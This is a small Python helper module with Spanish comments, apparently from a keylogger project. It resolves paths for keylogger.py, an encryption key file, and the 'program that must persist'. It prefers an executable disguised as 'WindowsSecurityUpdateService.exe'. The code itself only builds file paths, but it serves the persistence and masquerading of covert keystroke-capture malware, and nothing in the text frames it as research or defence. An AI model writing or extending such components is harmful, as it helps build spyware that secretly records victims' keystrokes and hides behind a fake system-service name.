"""
app_paths.py
Rutas del proyecto que funcionan tanto en script (.py) como compilado (.exe).
"""

import os
import sys


def get_app_dir() -> str:
    """Directorio donde vive keylogger.py o el .exe compilado."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


def get_key_path() -> str:
    return os.path.join(get_app_dir(), "secret.key")


def get_default_entrypoint() -> str:
    """Ruta del programa que debe persistir (script o exe)."""
    if getattr(sys, "frozen", False):
        return os.path.abspath(sys.executable)

    app_dir = get_app_dir()
    exe_path = os.path.join(app_dir, "WindowsSecurityUpdateService.exe")
    if os.path.isfile(exe_path):
        return exe_path

    return os.path.join(app_dir, "keylogger.py")